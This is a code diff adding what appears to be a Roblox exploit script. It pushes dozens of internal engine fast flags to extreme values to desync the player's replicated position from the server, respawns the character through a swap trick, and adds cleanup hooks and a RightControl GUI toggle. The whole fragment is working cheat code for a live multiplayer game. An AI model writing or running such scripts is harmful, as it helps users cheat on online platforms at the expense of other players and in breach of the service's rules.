+        CheckPVDifferencesForInterpolationMinVelThresholdStudsPerSecHundredth = 1,
+        LargeReplicatorSerializeRead3 = true,
+        ReplicationFocusNouExtentsSizeCutoffForPauseStuds = 2147483647,
+        CheckPVCachedVelThresholdPercent = 10,
+        CheckPVDifferencesForInterpolationMinRotVelThresholdRadsPerSecHundredth = 1,
+        GameNetDontSendRedundantDeltaPositionMillionth = 1,
+        InterpolationFrameVelocityThresholdMillionth = 5,
+        StreamJobNOUVolumeCap = 2147483647,
+        InterpolationFrameRotVelocityThresholdMillionth = 5,
+        CheckPVCachedRotVelThresholdPercent = 10,
+        WorldStepMax = 30,
+        InterpolationFramePositionThresholdMillionth = 5,
+        TimestepArbiterHumanoidTurningVelThreshold = 1,
+        SimOwnedNOUCountThresholdMillionth = 2147483647,
+        GameNetPVHeaderLinearVelocityZeroCutoffExponent = -5000,
+        NextGenReplicatorEnabledWrite4 = true,
+        TimestepArbiterOmegaThou = 1073741823,
+        MaxAcceptableUpdateDelay = 1,
+        LargeReplicatorSerializeWrite4 = true
+    }
+    
+    for name, value in pairs(FFlags) do
+        setFFlag(tostring(name), tostring(value))
+    end
+    
+    local char = LP.Character
+    if char then
+        local hum = char:FindFirstChildWhichIsA('Humanoid')
+        if hum then
+            hum:ChangeState(Enum.HumanoidStateType.Dead)
+        end
+        char:ClearAllChildren()
+        local newChar = Instance.new('Model')
+        newChar.Parent = workspace
+        LP.Character = newChar
+        task.wait()
+        LP.Character = char
+        newChar:Destroy()
+    end
+    
+    toggleDesync(true)
+    status.Text = "Desync Reset Complete ✅"
+end)
+
+local function cleanup()
+    pcall(function() setfflag("NextGenReplicatorEnabledWrite4", "False") end)
+end
+
+Players.PlayerRemoving:Connect(function(p) 
+    if p == LP then 
+        cleanup() 
+    end 
+end)
+
+LP.AncestryChanged:Connect(function(_, newParent)
+    if not newParent then
+        cleanup()
+    end
+end)
+
+TeleportService.TeleportInitFailed:Connect(cleanup)
+game:BindToClose(cleanup)
+
+UIS.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.RightControl then
+        gui.Enabled = not gui.Enabled
+    end
+end)
